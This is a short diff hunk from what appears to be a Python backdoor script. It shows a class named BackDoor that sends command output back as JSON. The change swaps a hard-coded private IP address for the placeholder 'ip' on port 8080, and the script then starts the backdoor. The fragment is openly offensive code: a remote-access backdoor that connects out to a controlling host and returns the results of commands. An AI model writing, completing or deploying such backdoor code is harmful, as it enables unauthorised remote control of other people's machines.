@@ -88,5 +88,5 @@ class BackDoor:
             self.json_send(command_output)
 
 
-my_backdoor_object = BackDoor("192.168.1.89", 8080)
+my_backdoor_object = BackDoor("ip", 8080)
 my_backdoor_object.start_backdoor()
